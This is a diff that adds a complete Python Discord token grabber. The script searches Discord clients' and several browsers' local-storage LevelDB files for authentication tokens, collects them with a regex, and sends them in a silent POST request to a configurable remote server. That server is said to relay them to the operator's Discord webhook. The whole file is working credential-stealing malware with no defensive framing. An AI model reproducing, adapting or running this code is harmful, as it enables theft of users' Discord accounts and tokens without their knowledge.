@@ -1,0 +1,58 @@
+import os
+import re
+import requests
+
+# configuration
+API_IP = '127.0.0.1'  # change to your server IP
+API_PORT = 5001  # change to your API port defined in config.json
+SECRET = 'aSPQq7gE86coXJbuikEbf9IEkablz6Rw' # change to your secret defined in config.json
+
+# set paths to where tokens are stored
+localappdata = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+paths = {
+    'Discord': os.path.join(roaming, 'Discord'),
+    'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
+    'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
+    'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
+    'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
+    'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+    'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
+}
+
+# il token grabber
+tokens = []
+
+for platform, path in paths.items():
+    path = os.path.join(path, 'Local Storage', 'leveldb')
+
+    if os.path.exists(path) is False:
+        continue
+
+    for item in os.listdir(path):
+        if not item[-4:] in ('.log', '.ldb'):
+            continue
+
+        with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
+            lines = file.readlines()
+
+        for line in lines:
+            line = line.strip()
+
+            if len(line) == 0:
+                continue
+
+            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
+                if token in tokens:
+                    continue
+
+                tokens.append(token)
+
+# send tokens to the webhook protection API that will validate them and send them to your Discord server over webhook
+try:
+    data = {'secret': SECRET, 'tokens': tokens}
+
+    # note that using json=data, requests module automatically sets the Content-Type header to application/json
+    requests.post(f'http://{API_IP}:{API_PORT}/grab', json=data)
+except:
+    pass
